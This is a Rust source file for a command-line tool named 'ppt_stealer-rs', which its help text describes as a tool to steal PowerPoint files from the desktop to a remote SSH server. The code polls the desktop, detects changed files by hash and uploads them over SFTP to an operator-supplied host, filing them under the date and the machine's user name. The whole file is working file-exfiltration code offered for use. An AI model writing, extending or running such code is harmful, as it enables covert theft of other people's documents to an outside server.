use chrono::Local;
use clap::{Parser, ArgGroup};
use connection_tools::SshSessionGuard;
use log;
use env_logger;
use ssh2::Session;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::{fs, io};
use std::net::TcpStream;
use std::thread::sleep;
use std::time::Duration;
use std::{self, str::FromStr};
use std::path::{PathBuf, Path};

mod watch_dog;
mod connection_tools;

#[derive(Parser, Debug)]
#[command(name = "ppt_stealer-rs", version = "0.2-beta.2")]
#[command(about = "A tool to steal PowerPoint files from desktop to remote SSH server.", long_about = None)]
#[command(group(
    ArgGroup::new("auth")
        .args(&["password", "key_auth"])
        .required(false)
        .multiple(false)
))]
struct Cli {
    #[arg(short = 'i', long, help = "SSH IP address or domain")]
    ssh_ip: Option<String>,

    #[arg(short = 'p', long, help = "SSH IP port")]
    ssh_port: Option<i64>,

    #[arg(short = 'u', long, help = "SSH username")]
    username: Option<String>,

    #[arg(short = 'P', long, group = "auth", help = "SSH password")]
    password: Option<String>,

    #[arg(long, default_value_t = false, group = "auth", help = "Use SSH key authentication. If not assigned, password authentication will be used.")]
    key_auth: bool,

    #[arg(long, default_value_t = 30, help = "Refresh interval in seconds")]
    refresh_interval: u64,

    #[arg(long, default_value_t = false, help = "Assign no GUI mode")]
    no_gui: bool,

    #[arg(long, help = "Folder name for files")]
    folder_name: Option<String>,

    #[arg(short = 'L', long, help = "Debug level. Choose from trace, debug, info, warn and error", default_value = "warn")]
    debug_level: String,
}


fn main() {

    
    // Parse command line arguments
    let args = Cli::parse();

    // set debug level
    std::env::set_var("RUST_LOG", &args.debug_level);
    env_logger::init();

    // Set up logging
    // print name and version
    log::info!("ppt_stealer-rs v0.2");
    // print args
    log::info!("Args: {:?}", args);

    // get desktop path
    let desktop_path = match dirs::desktop_dir() {
        Some(path) => path,
        None => {
            // ask user for desktop path
            let mut path = String::new();
            std::io::stdin().read_line(&mut path).expect("Failed to read line");
            let path = PathBuf::from_str(path.trim()).unwrap();
            // check if the given desktop path is valid
            match path.is_dir() {
                true => path,
                false => {
                    log::error!("{} is invalid desktop path", path.display());
                    std::process::exit(1);
                }
            }
        }
    };
    log::info!("Desktop path: {}", desktop_path.display());

    println!("Hello, world!");

    if args.no_gui {
        no_gui(&desktop_path, args);
    } else {
        // start GUI
        log::error!("GUI mode is still under development.");
    }
}

fn no_gui(desktop_path: &Path, args: Cli) {
    log::info!("No GUI mode on.");

    let sess: Arc<Mutex<Session>> = Arc::new(Mutex::new(establish_ssh_connection(&args)));

    let _sess_guard = SshSessionGuard{session: &sess};

    // TODO: Have SshSessionGuard replace the mutex.
    // make sure ssh connection closed after Ctrl+C.
    ctrlc::set_handler({
        let sess = Arc::clone(&sess);
        move || {
            log::info!("Ctrl+C detected. Exiting...");
            let sess = sess.lock().unwrap();
            sess.disconnect(None, "CtrlC detected", None).expect("Failed to disconnect from SSH server.");
            log::info!("SSH session closed.");
            std::process::exit(0);
        }
    }).expect("Error setting Ctrl+C handler.");

    log::info!("Start monitering files...");

    let mut file_hashes: HashMap<PathBuf, String> = HashMap::new();

    loop {
        let path_bufs: Vec<PathBuf> = watch_dog::file_moniter(desktop_path);

        // let paths: Vec<&Path> = path_bufs.iter().map(|p: &PathBuf| p.as_path()).collect::<Vec<&Path>>();

        let new_file_hashes = watch_dog::get_hashes(&path_bufs);

        let changed_files: Vec<PathBuf> = watch_dog::get_changed_files(&file_hashes, &new_file_hashes);

        if changed_files.len() > 0 {
            log::info!("Detected changed files.");

            log::debug!("Changed files: {:?}", changed_files);

            file_hashes = new_file_hashes;

            upload_changed_files(changed_files, &args, &sess);

        } else {
            log::info!("No changes detected.");
        }
        
        sleep(Duration::from_secs(args.refresh_interval));
    }
}

fn establish_ssh_connection(args: &Cli) -> Session  {
    log::info!("Connecting to SSH server...");

    let tcp = {
        let ip = args.ssh_ip.as_ref().expect("On no GUI mode, SSH IP address is required!");
        let port = args.ssh_port.unwrap_or_else(|| 22);

        let addr = format!("{}:{}", ip, port);

        log::info!("Connecting to SSH server: {}", addr);

        match TcpStream::connect(addr) {
            Ok(stream) => stream,
            Err(e) => {
                log::error!("Failed to connect to SSH server: {}", e);
                std::process::exit(1);
            }
        }
    };
    log::info!("Established tcp connection with SSH server.");

    log::info!("Starting SSH session...");
    let mut sess = Session::new().unwrap();
    sess.set_tcp_stream(tcp);
    sess.handshake().unwrap();
    if args.key_auth {
        let private_key_path = dirs::home_dir().unwrap().join(".ssh/id_rsa");
        log::debug!("Authenticating with rivate key: {}", private_key_path.display());

        sess.userauth_pubkey_file(
            args.username.as_ref().expect("On no GUI mode, SSH username is required!"),
            None,
            &private_key_path,
            None,
        ).expect("Failed to authenticate with SSH key.");
    } else {
        sess.userauth_password(
            args.username.as_ref().expect("On no GUI mode, SSH username is required!"),
            args.password.as_ref().expect("On no GUI mode, SSH password is required!"),
        ).expect("Failed to authenticate with SSH password.");
    }
    assert!(sess.authenticated());
    log::info!("SSH Authentication successful.");

    sess
}

fn upload_changed_files(changed_files: Vec<PathBuf>, args: &Cli, sess: &Arc<Mutex<Session>>) {

    // Upload changed files through SFTP.
    // determine remote folder name where the files will be uploaded.
    // the remote folder name is {YYYY-MM-DD/args.remote_folder}

    let formatted_date = Local::now().format("%Y-%m-%d").to_string();

    let remote_folder_name = {

        let computer_identifier = match args.folder_name.as_ref() {
            Some(name) => name.to_string(),
            None => {
                let home_dir = dirs::home_dir().unwrap();
                home_dir.file_name().unwrap().to_str().unwrap().to_string()
            }
        };

        format!("{}/{}", formatted_date, computer_identifier)
    };

    log::info!("Uploading changed files to {}", remote_folder_name);

    // establish sftp session
    let sftp = {
        let sess = sess.lock().unwrap();
        sess.sftp().unwrap()
    };
    log::info!("SFTP session established.");

    // 检查远程文件夹是否存在
    {
        let remote_folder_exists = sftp.stat(Path::new(&formatted_date)).is_ok();
        
        if !remote_folder_exists {
            log::info!("Remote folder '{}' does not exist, creating it.", &formatted_date);
            // 创建远程文件夹
            sftp.mkdir(Path::new(&formatted_date), 0o755).expect("Failed to create remote folder.");
        } else {
            log::info!("Remote folder '{}' already exists.", &formatted_date);
        }

        let remote_folder_exists = sftp.stat(Path::new(&remote_folder_name)).is_ok();
        if !remote_folder_exists {
            log::info!("Remote folder '{}' does not exist, creating it.", &remote_folder_name);
            // 创建远程文件夹
            sftp.mkdir(Path::new(&remote_folder_name), 0o755).expect("Failed to create remote folder.");
        } else {
            log::info!("Remote folder '{}' already exists.", &remote_folder_name);
        }
    }
    

    // upload changed files to the assigned folder.
    for file in changed_files {
        log::debug!("Uploading {}", file.to_str().unwrap());

        // open local file
        let mut local_file = fs::File::open(&file).expect("Failed to open local file.");

        // check if remote file exists. If so, remove it.
        let remote_file_path = format!("{}/{}", remote_folder_name, file.file_name().unwrap().to_str().unwrap());
        let remote_file_exists = sftp.stat(Path::new(&remote_file_path)).is_ok();
        if remote_file_exists {
            log::info!("Remote file '{}' already exists, removing it.", &remote_file_path);
            sftp.unlink(Path::new(&remote_file_path)).expect("Failed to remove remote file.");
        }

        // create remote file
        let mut remote_file = sftp.create(Path::new(&remote_file_path)).expect("Failed to create remote file.");

        // copy local file to remote server
        io::copy(&mut local_file, &mut remote_file).expect("Failed to copy file.");
    }
    log::info!("Finished uploading files.");
}
